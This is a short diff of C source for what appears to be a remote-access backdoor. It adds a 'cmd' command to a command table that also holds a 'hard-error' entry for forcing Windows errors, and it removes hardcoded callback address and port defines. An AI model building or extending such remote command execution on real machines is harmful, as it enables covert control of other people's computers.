@@ -12,7 +12,8 @@ Command commands[N_COMMANDS] = {
 	{ "reply", ReplyCommand, TRUE},
 	{ "hard-error", (CommandProc) NtRaiseHardErrorCommand, FALSE},
 	{ "cd", ChangeDirectoryCommand, TRUE },
-	{ "cwd", (CommandProc) GetCwdCommand, FALSE }
+	{ "cwd", (CommandProc) GetCwdCommand, FALSE },
+	{ "cmd", CmdCommand, TRUE }
 };
 
 static void CommandExecutor(PSTR buffer) {
@@ -43,9 +44,6 @@ static void CommandExecutor(PSTR buffer) {
 				"Invalid command\n"
 				"Use \"help\" to get help.\n");
 }
-
-#define DST "192.168.2.103"
-#define PORT 12345
 
 #define SendInitialInfo(wsad) { \
 	char buf[BUFSIZE]; \
